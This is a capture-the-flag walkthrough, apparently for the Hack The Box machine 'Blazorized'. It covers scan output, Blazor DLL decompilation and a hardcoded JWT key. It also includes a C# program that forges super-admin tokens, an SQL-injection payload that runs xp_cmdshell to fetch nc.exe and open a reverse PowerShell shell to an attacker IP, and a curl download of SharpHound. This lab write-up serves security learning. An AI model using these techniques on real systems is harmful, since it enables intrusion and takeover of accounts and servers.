![](images/Pasted%20image%2020240702151059.png)

![](images/Pasted%20image%2020240702151335.png)

# **01- RECONNAISSANCE AND ENUMERATION**

Starting with Rustscan for open ports here nmap give me false result.
```bash
rustscan -a 10.10.11.22 -t 500 -b 1500 -- -A

Open 10.10.11.22:53
Open 10.10.11.22:80
Open 10.10.11.22:88
Open 10.10.11.22:135
Open 10.10.11.22:139
Open 10.10.11.22:5985
Open 10.10.11.22:9389
Open 10.10.11.22:47001
Open 10.10.11.22:49664
Open 10.10.11.22:49665
Open 10.10.11.22:49669
Open 10.10.11.22:49666
Open 10.10.11.22:49670
Open 10.10.11.22:49667
Open 10.10.11.22:49672
Open 10.10.11.22:49671
Open 10.10.11.22:49678
Open 10.10.11.22:49779
Open 10.10.11.22:49776
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A" on ip 10.10.11.22
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 05:53 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:53
Completed NSE at 05:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:53
Completed NSE at 05:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:53
Completed NSE at 05:53, 0.00s elapsed
Initiating Ping Scan at 05:53
Scanning 10.10.11.22 [2 ports]
Completed Ping Scan at 05:53, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:53
Completed Parallel DNS resolution of 1 host. at 05:53, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 05:53
Scanning 10.10.11.22 [19 ports]
Discovered open port 53/tcp on 10.10.11.22
Discovered open port 139/tcp on 10.10.11.22
Discovered open port 135/tcp on 10.10.11.22
Discovered open port 49667/tcp on 10.10.11.22
Discovered open port 49669/tcp on 10.10.11.22
Discovered open port 49670/tcp on 10.10.11.22
Discovered open port 47001/tcp on 10.10.11.22
Discovered open port 80/tcp on 10.10.11.22
Discovered open port 49672/tcp on 10.10.11.22
Discovered open port 49779/tcp on 10.10.11.22
Discovered open port 49776/tcp on 10.10.11.22
Discovered open port 49664/tcp on 10.10.11.22
Discovered open port 5985/tcp on 10.10.11.22
Discovered open port 49678/tcp on 10.10.11.22
Discovered open port 49671/tcp on 10.10.11.22
Discovered open port 9389/tcp on 10.10.11.22
Discovered open port 49666/tcp on 10.10.11.22
Discovered open port 88/tcp on 10.10.11.22
Discovered open port 49665/tcp on 10.10.11.22
Completed Connect Scan at 05:53, 0.94s elapsed (19 total ports)
Initiating Service scan at 05:53
Scanning 19 services on 10.10.11.22
Service scan Timing: About 52.63% done; ETC: 05:55 (0:00:53 remaining)
Completed Service scan at 05:54, 67.75s elapsed (19 services on 1 host)
NSE: Script scanning 10.10.11.22.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 15.88s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 1.84s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
Nmap scan report for 10.10.11.22
Host is up, received syn-ack (0.43s latency).
Scanned at 2024-07-02 05:53:24 EDT for 86s

PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://blazorized.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-07-02 09:53:25Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49672/tcp open  msrpc        syn-ack Microsoft Windows RPC
49678/tcp open  msrpc        syn-ack Microsoft Windows RPC
49776/tcp open  ms-sql-s     syn-ack Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-info: 
|   10.10.11.22:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 49776
| ms-sql-ntlm-info: 
|   10.10.11.22:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-02T09:39:52
| Not valid after:  2054-07-02T09:39:52
| MD5:   4650:b8cd:f80a:f645:c03c:7b17:7fa5:b0af
| SHA-1: d471:7f2b:397f:fd43:27be:2487:1ab6:4c93:f441:57e8
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQFoMQxTk5VqVJG+4VPhZFqzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjQwNzAyMDkzOTUyWhgPMjA1NDA3MDIwOTM5NTJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAOxhsxZy
| uCCKwqrXfMdldP6bgDr7L4fRstyd2ETaUYHklCVvqWmTFxiLYMqeMJhNJvaLav8l
| 1gFymb/krckx7Nw8bjdbv3dp9BFya1ZqBrSdzDzRrcwAa2H5whi+dNGgSHOH+r+B
| jffGi9qToUbLqlBoRgW9mLJh9N6Gm/WI+UTZtDQRwtsetibBEU7CrK89C4tQG4f9
| R+WJX5LkL5HdXe9IZq5fslZs7LSEpcB7qT2wEzsERGWCYPNnVGI0bxh7TqWOG8Le
| n7lmfMGdW0pE4yIb+t6XYIWL9qN3CcSuCCV3a8nmSqjl+j0FBNJ66ASgFQqcgdjU
| kQteo9wYz6UK5SwrDmpqmJJSisytADHOORjMorKYOcIxoBKCihLBQAfsKen4ojsB
| VC3OGiOkEH2Y2quF+q3vDgc01pfTPJBDVPeD0E48s+3vJ9iZ16r3Wq0eAglnCUbd
| qM7LDGRlItRY32DSRQoqAnZcBQ6OFF6SK34n/wqsSuxTOWOIsoXYOXQJZQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQB6MCqJ6cCN2REv60pRHbOO6D6FlCHB504kHX4E
| mWlP2dwmW9cbjSwYZtGhVPgRqd6PTZFk7XaoyNEvJnQZHA3McSNlpl6Rv/zJqaYI
| x01sOutWhfBUlB9ly2fijmVrKpemquYlKifozpgGX2sO7FTl8n7RvKpgZl8UaiEx
| kvxNPreddPyMdvi8o+mgd93RRdV6DRqYk/+YTTtbATreXzIBpaJpDDeW9TxwsWLv
| OuocFDeL9mXSUa/WeMj4s7ryk3PjINeQNXHinW+pPT586LeDAbpw2gJPNiR7DsVy
| CiauBuTH81bPWwCyLSw5MOl+3stlgvscAN9YxBnkLvdsMmIyDgmeOycWGbw8+sDz
| co2QmKIkY4tbUKNOx5zfSUSkhNbhnplred3ixYW9ScUoNcMFqt9R2Lq9QjLEA/M9
| RqvloGcrxtZrYCehDkvgcOm0n0BOS44ftAgG92EA4844ulCUfTteeWJ+w6aTG9iQ
| X4RbVxhlP35JuVPvcWdh08LzLKk=
|_-----END CERTIFICATE-----
|_ssl-date: 2024-07-02T09:54:43+00:00; -7s from scanner time.
49779/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 49214/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46880/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35591/udp): CLEAN (Failed to receive data)
|   Check 4 (port 56268/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_clock-skew: mean: -6s, deviation: 0s, median: -7s
|_smb2-time: ERROR: Script execution failed (use -d to debug)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.13 seconds

```

```
The machine appears to be a standard Active Directory box with numerous ports, we will
classify the protocol and match with their operations:

DNS - port 53 (since the server is serving the domain, we can specify if we collect
bloodhound data )
Kerberos - port 88 & 464 : Runs the Kerberos authentication server which is used to
acquire Kerberos tickets and even check for valid user enumeration.
HTTP - port 80 which leaks host name: blazorized.htb
Server Message Block Service (SMB) - port 139 & 445 (the port 139 assists in serving
the main port 445). This process is used to enumerate shares.
Remote Procedure Client - port 139 & 493. Used for remote connection to the
computer. If this port is open, then most likely (99% sure) WinRM is open. The port can be
verified using:

```

Here i start enumeration DNS and SMB but i don't get anything .

**Enumerating Port 80**

![](images/Pasted%20image%2020240702170737.png)

Here the website is built in BLAZOR Framework.

I try different things but don't get any good outcome.

Go for Dir Enumeration 

```bash
dirsearch -u http://blazorized.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/tools/dnSpy/reports/http_blazorized.htb/_24-07-02_07-39-50.txt

Target: http://blazorized.htb/

[07:39:50] Starting: 
[07:39:59] 403 -  312B  - /%2e%2e//google.com                               
[07:40:00] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[07:40:17] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[07:40:50] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
                                                                             
Task Completed

```

Go for VHOST Enumeration:

```bash
ffuf -u http://10.10.11.22 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.blazorized.htb" -mc all -ac


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.22
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.blazorized.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

admin                   [Status: 200, Size: 2077, Words: 149, Lines: 28, Duration: 272ms]
api                     [Status: 404, Size: 0, Words: 1, Lines: 1, Duration: 449
```

We get 1 VHOST , add it to host file and upon visiting its a admin login panel.

From here there are 2 ways to get those dll files:

1- Examine Framework of BLAZOR:

There is nothing else to take advantage so i visit BLAZOR github to take a look on BLAZOR Framework  , after looking structure on [Github]([AspNetCore.Docs/aspnetcore/blazor/project-structure.md at main · dotnet/AspNetCore.Docs (github.com)](https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md)) there are several endpoints with specific features.

![](images/Pasted%20image%2020240702172026.png)

![](images/Pasted%20image%2020240702172105.png)

Here _framework_ dir is a special directory used by BAZOR to store the framework files required for BLAZOR Webassembly Runtime.

So visiting the _framework/blazor.webassembly.js 

http://blazorized.htb/_framework/blazor.webassembly.js

![](images/Pasted%20image%2020240702174752.png)

It look like i have to Deobfuscate it so i visit [JavaScript Deobfuscator (relative.im)](https://deobfuscate.relative.im/)

Here i paste that code and Deobfuscate it.

![](images/Pasted%20image%2020240702175050.png)

Now Extracting the code and searching for framework and discovering for a hidden interface

We see many framework but _framework/blazor.boot.json_ that we see in github page .

![](images/Pasted%20image%2020240702175014.png)

Visiting http://blazorized.htb/_framework/blazor.boot.json

![](images/Pasted%20image%2020240702180647.png)

He get Microsoft default dll files + some custom dll files named Blazored.

```bash
Blazored.LocalStorage.dll       "sha256-5V8ovY1srbIIz7lzzMhLd3nNJ9LJ6bHoBOnLJahv8Go="
Blazorized.DigitalGarden.dll    "sha256-YH2BGBuuUllYRVTLRSM+TxZtmhmNitErmBqq1Xb1fdI="
Blazorized.Shared.dll   "sha256-Bz/iaIKjbUZ4pzYB1LxrExKonhSlVdPH63LsehtJDqY="
Blazorized.Helpers.dll  "sha256-ekLzpGbbVEn95uwSU2BGWpjosCK/fqqQRjGFUW0jAQQ="

```

**2- Using Burpsuite:

Looking for Burp Suite to check other things:

Checking Updates:

![](images/Pasted%20image%2020240704133833.png)

This site appears to use a form of JWT token for authentication , we can decode it [jwt.io](https://jwt.io/) and check for more details.

![](images/Pasted%20image%2020240704134740.png)

Here we can see and Algorithm is responsible for creating token and down asking for a 256-bit key it means there is a key exists in order to forge token.

Here we get some dll files also and its seems quite unique because likely dll files starts with Microsoft.

Here i use Burpsuite to check the website manually:

![](images/Pasted%20image%2020240703204111.png)

Here i am seeing some .dll files seems interesting now i am trying to intercept req for diif parts:

Downloads these 4 files .

```bash
gedit http://blazorized.htb/_framework/Blazored.LocalStorage.dll

gedit http://burpsuite/repeat/1/yj9rvq71fkl5g59l7q2im64vr9t024hu

gedit http://burpsuite/repeat/2/1cgjevv0evf5tzv6m0223fnw3siooto1

gedit http://burpsuite/repeat/3/hj9bhx97wa7jtq49gnq60at9pvox4c7a
```

Now in order to examine dll files we have to use some software or tool so in this case we are using [dnSpy/dnSpy: .NET debugger and assembly editor (github.com)](https://github.com/dnSpy/dnSpy)

But there are 2 approaches here it is a window tool so we can use [wine](https://github.com/wine-mirror/wine) 
, I installed DNSpy for Windows and then Examine dll files.

Importing and Examine Blazorized-Helpers.dll :

![](images/Pasted%20image%2020240704135956.png)

We notice that the JWT class is implemented in this particular file contains the GenerateSuperAdminwJWT which seems so enticing. Let us break apart the class or function.

```bash
// Token: 0x0600000A RID: 10 RVA: 0x00002258 File Offset: 0x00000458        public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60L)        {            string result;            try            {                List<Claim> list = new List<Claim>                {                    new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", JWT.superAdminEmailClaimValue),                    new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.superAdminRoleClaimValue)                };                string text = JWT.issuer;                string text2 = JWT.adminDashboardAudience;                IEnumerable<Claim> enumerable = list;                SigningCredentials signingCredentials = JWT.GetSigningCredentials();                DateTime? dateTime = new DateTime?(DateTime.UtcNow.AddSeconds((double)expirationDurationInSeconds));                JwtSecurityToken jwtSecurityToken = new JwtSecurityToken(text, text2, enumerable, null, dateTime, signingCredentials);                result = new JwtSecurityTokenHandler().WriteToken(jwtSecurityToken);            }            catch (Exception)            {                throw;            }            return result;        }
```

Breaking it to simplify:

```java
public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60L)
```
```
- The function is defined as `public static`, meaning it can be accessed without instantiating the class.
- It returns a `string` representing the generated JWT.
- It takes one optional parameter `expirationDurationInSeconds` with a default value of 60 seconds.
```

```java
List<Claim> list = new List<Claim>
{
    new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", JWT.superAdminEmailClaimValue),
    new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.superAdminRoleClaimValue)
};
```
```
- A list of claims is created. Claims are pieces of information about the user.
- Two claims are added:
    - An email address claim with a predefined value (`JWT.superAdminEmailClaimValue`).
    - A role claim with a predefined value (`JWT.superAdminRoleClaimValue`)

```

```java
string text = JWT.issuer;
string text2 = JWT.adminDashboardAudience;
```
```
`text` and `text2` store the token issuer and audience, respectively.
```

```java
IEnumerable<Claim> enumerable = list;
SigningCredentials signingCredentials = JWT.GetSigningCredentials();
DateTime? dateTime = new DateTime?(DateTime.UtcNow.AddSeconds((double)expirationDurationInSeconds));
```
```
- `enumerable` stores the list of claims.
- `signingCredentials` are obtained by calling `JWT.GetSigningCredentials()`. This provides the cryptographic key and algorithm to sign the token.
- `dateTime` sets the token's expiration time to the current time plus the specified duration.
```

```java
JwtSecurityToken jwtSecurityToken = new JwtSecurityToken(text, text2, enumerable, null, dateTime, signingCredentials);
```
```
A new `JwtSecurityToken` object is created with the issuer, audience, claims, no not-before time (null), expiration time, and signing credentials.
```

```java
result = new JwtSecurityTokenHandler().WriteToken(jwtSecurityToken);
catch (Exception)
{
    throw;
}
return result;
```
```
The JWT is written to a string using `JwtSecurityTokenHandler().WriteToken(jwtSecurityToken)` and stored in `result`

Any exceptions that occur during the process are caught and re-thrown.

The generated JWT string is returned.
```

The `GenerateSuperAdminJWT` function generates a JWT for a super admin with email and role claims, signs it with specific credentials, and sets an expiration time. The generated token is then returned as a string.

From the above we see the following structure for the SuperAdminJWT .

```bash
{
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin",
  "exp": 101010101,
  "iss": "http://api.blazorized.htb",
  "aud": "http://admin.blazorized.htb"
}

```

```bash
// Token: 0x04000005 RID: 5        private const long EXPIRATION_DURATION_IN_SECONDS = 60L;        

// Token: 0x04000006 RID: 6        private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";        
// Token: 0x04000007 RID: 7        private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";        

// Token: 0x04000008 RID: 8        private static readonly string postsPermissionsClaimValue = "Posts_Get_All";        

// Token: 0x04000009 RID: 9        private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";        

// Token: 0x0400000A RID: 10        private static readonly string superAdminRoleClaimValue = "Super_Admin";        

// Token: 0x0400000B RID: 11        private static readonly string issuer = "http://api.blazorized.htb";        

// Token: 0x0400000C RID: 12        private static readonly string apiAudience = "http://api.blazorized.htb";        

// Token: 0x0400000D RID: 13        private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";    }  
}
```

Here we get security key lets generate a JWT token.

We will use C# program to create jwt token as from python it would be easy so i mention that also at last:

1. Ensure you have dotnet running (the version may be unclear but use latest one). You can check how to install dotnet on linux: https://learn.microsoft.com/enus/dotnet/core/install/linux 

2. Initialize a new project using dotnet

```bash
dotnet new console -n JWT_Generator 
The template "Console App" was created successfully.

Processing post-creation actions...
Running 'dotnet restore' on /home/kali/Desktop/HTB/Blazorized/JWT_Generator/JWT_Generator.csproj...
  Determining projects to restore...
  Restored /home/kali/Desktop/HTB/Blazorized/JWT_Generator/JWT_Generator.csproj (in 5.76 sec).
Restore succeeded.

```

3. Add necessary NuGet packages to be used by the dotnet:

```bash

cd JWT_Generator

──(kali㉿kali)-[~/Desktop/HTB/Blazorized/JWT_Generator]
└─$ ls
JWT_Generator.csproj  obj  Program.cs

dotnet add package System.IdentityModel.Tokens.Jwt
```

4. Create the program in the already created Program.cs

```bash

using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using Microsoft.IdentityModel.Tokens;

public static class JWT
{
    private const long EXPIRATION_DURATION_IN_SECONDS = 60000L;
    private const string jwt_key = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";
    private const string superAdminEmailClaimValue = "superadmin@blazorized.htb";
    private const string postsPermissionsClaimValue = "Posts_Get_All";
    private const string categoriesPermissionsClaimValue = "Categories_Get_All";
    private const string superAdminRoleClaimValue = "Super_Admin";
    private const string issuer = "http://api.blazorized.htb";
    private const string apiAudience = "http://api.blazorized.htb";
    private const string adminDashboardAudience = "http://admin.blazorized.htb";

    // A function to get signing credentials
    private static SigningCredentials GetSigningCredentials()
    {
        byte[] key = Encoding.UTF8.GetBytes(jwt_key);
        SymmetricSecurityKey security_key = new SymmetricSecurityKey(key);
        SigningCredentials signing_credentials = new SigningCredentials(security_key, SecurityAlgorithms.HmacSha512);
        return signing_credentials;
    }

    // Write a function to generate a JWT for the API
    public static string GenerateTemporaryJWT(long expiration_duration = 100000L)
    {
        string jwt_result;
        try
        {
            List<Claim> token_list = new List<Claim>
            {
                new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", superAdminEmailClaimValue),
                new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", postsPermissionsClaimValue),
                new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", categoriesPermissionsClaimValue)
            };

            string jwt_issuer = issuer;
            string jwt_aud = apiAudience;
            IEnumerable<Claim> enumerable_object = token_list;
            SigningCredentials signing_credentials = GetSigningCredentials();
            DateTime? time_now = DateTime.UtcNow.AddSeconds(expiration_duration);
            JwtSecurityToken jwt_token = new JwtSecurityToken(jwt_issuer, jwt_aud, enumerable_object, null, time_now, signing_credentials);
            jwt_result = new JwtSecurityTokenHandler().WriteToken(jwt_token);
        }
        catch (Exception ex)
        {
            throw new Exception("Error generating JWT: " + ex.Message);
        }
        return jwt_result;
    }

    // Function to generate a SuperAdmin JWT
    public static string GenerateSuperAdminJWT(long expiration_duration = 100000L)
    {
        string jwt_result;
        try
        {
            List<Claim> token_list = new List<Claim>
            {
                new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", superAdminEmailClaimValue),
                new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", superAdminRoleClaimValue),
            };

            string jwt_issuer = issuer;
            string jwt_aud = adminDashboardAudience;
            IEnumerable<Claim> enumerable_object = token_list;
            SigningCredentials signing_credentials = GetSigningCredentials();
            DateTime? time_now = DateTime.UtcNow.AddSeconds(expiration_duration);
            JwtSecurityToken jwt_token = new JwtSecurityToken(jwt_issuer, jwt_aud, enumerable_object, null, time_now, signing_credentials);
            jwt_result = new JwtSecurityTokenHandler().WriteToken(jwt_token);
        }
        catch (Exception ex)
        {
            throw new Exception("Error generating SuperAdmin JWT: " + ex.Message);
        }
        return jwt_result;
    }
}

class Program
{
    static void Main(string[] args)
    {
        string token = JWT.GenerateTemporaryJWT();
        Console.WriteLine($"Temporary JWT: {token}");

        string admin_token = JWT.GenerateSuperAdminJWT();
        Console.WriteLine($"Super Admin JWT: {admin_token}");
    }
}

```

Its for both Temporary jwt token and Super_admin jwt token:

Time to run it:

```bash
dotnet run
```
![](images/Pasted%20image%2020240704225416.png)

here we can se it generated two jwt token , Lets try Temp jwt token first:

```bash
curl "http://api.blazorized.htb/posts" -H "authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzIwMjEzNzM0LCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.E4EyedK00viwUW3ExFU2Aj5xtHahOh0nkvHupfKTa0CtBjnAYH7rxvf1oNHQq2C1CJZzvAY9a0bbAGFgTfijFQ" -X GET -I
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Type: application/json
Server: Microsoft-IIS/10.0
Date: Thu, 04 Jul 2024 17:22:46 GMT

```

here we get `200` Response seems good now use `Super_Admin` jwt token:

It seems to be storing items in the Local Storage of the browser and fetching data from there. We can try to store our JWT in the place for trial purposes. Now I tried a lot of variants for the keys (manually and it hurt me): 

The last one seemed to work: We gain access to the panel! 
- authToken 
- Bearer 
- authorisation 
- JWT 
- jwt

![](images/Pasted%20image%2020240704225757.png)

After that refresh the page , and we successfully bypass admin panel:

![](images/Pasted%20image%2020240704225851.png)


It seems as if the admin can talk directly to the MSSQL server, this prompts us to go for SQL attacks on any point of input. Looking around we are greeted with a weird form

![](images/Pasted%20image%2020240704230055.png)

This form is checking for duplicate post titles; since it talks directly to the server, a SELECT query is most likely in use. If any SQL injection exist, it will most likely exist in this particular form.

![](images/Pasted%20image%2020240704230604.png)

Since the database type was found to be MSSQL before, we directly try to use the xp_cmdshell to execute the bounce shell command.

My payload:

```bash
1';use master; exec xp_cmdshell "curl 10.10.16.11/nc.exe -o
/programdata/nc.exe && /programdata/nc.exe 10.10.16.11 4444 -e powershell";
-- -
```

![](images/Pasted%20image%2020240704161328.png)

Here we get user.txt:

```bash
type user.txt
652926f13f1e6330b1911e986b61d881
```

Here then i go for SharpHound to collect data so that i can get a better grasp of AD.

```bash
PS C:\Users\nu_1055\Desktop> curl 10.10.16.11/SharpHound.exe -o SharpHound.exe
